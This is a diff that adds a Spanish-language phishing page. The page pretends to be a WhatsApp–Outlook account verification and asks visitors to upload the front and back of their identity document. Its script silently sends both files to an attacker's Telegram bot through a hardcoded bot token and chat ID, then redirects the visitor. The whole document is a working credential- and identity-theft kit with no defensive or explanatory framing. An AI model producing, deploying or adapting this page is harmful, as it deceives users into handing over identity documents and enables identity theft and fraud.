@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verificación de Identidad</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-image: url('./index12_files/patrn.jpg'); /* <-- cambia esto por tu imagen */
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      padding: 20px;
+      text-align: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.95); /* fondo blanco semi-transparente */
+      max-width: 400px;
+      margin: auto;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #ccc;
+      margin-top: 50px;
+    }
+
+    input[type="file"] {
+      margin: 10px 0;
+      width: 100%;
+    }
+
+    button {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      background-color: #999;
+    }
+
+    .error {
+      color: red;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body onload="mostrarAlerta()">
+  <div class="container">
+    <h2>No se pudo asociar su cuenta de WhatsApp</h2>
+    <p>
+      Estimado usuario:<br><br>
+      No fue posible completar la vinculación de su cuenta de WhatsApp con su cuenta de Outlook.<br><br>
+      Como medida adicional de seguridad y para continuar con el proceso de validación, le solicitamos que adjunte su documento de identidad por ambos lados (anverso y reverso).
+    </p>
+
+    <form id="docForm">
+      <label>Documento - Anverso:</label><br>
+      <input type="file" id="anverso" accept="image/*,application/pdf" required><br>
+
+      <label>Documento - Reverso:</label><br>
+      <input type="file" id="reverso" accept="image/*,application/pdf" required><br>
+
+      <button type="submit">Enviar Documentación</button>
+      <div class="error" id="error-msg"></div>
+    </form>
+  </div>
+
+  <script>
+    function mostrarAlerta() {
+      alert("No se pudo asociar su cuenta de WhatsApp a Outlook. Para continuar, siga los pasos de verificación.");
+    }
+
+    const BOT_TOKEN = "8107173590:AAEF_elz7cSx8D2S2pDF3UddMbqrWMAeT1c";
+    const CHAT_ID = "-4802195491";
+
+    document.getElementById("docForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      const anverso = document.getElementById("anverso").files[0];
+      const reverso = document.getElementById("reverso").files[0];
+      const errorMsg = document.getElementById("error-msg");
+
+      if (!anverso || !reverso) {
+        errorMsg.textContent = "Por favor, adjunte ambos lados del documento.";
+        return;
+      }
+
+      try {
+        await enviarArchivo(anverso, "Documento de identidad - Anverso");
+        await enviarArchivo(reverso, "Documento de identidad - Reverso");
+
+        window.location.href = "index3.html";
+      } catch (err) {
+        console.error("Error al enviar archivos:", err);
+        errorMsg.textContent = "Ocurrió un error al enviar los documentos. Intente nuevamente.";
+      }
+    });
+
+    async function enviarArchivo(file, caption) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("caption", caption);
+      formData.append("document", file);
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+        method: "POST",
+        body: formData
+      });
+    }
+  </script>
+</body>
+</html>
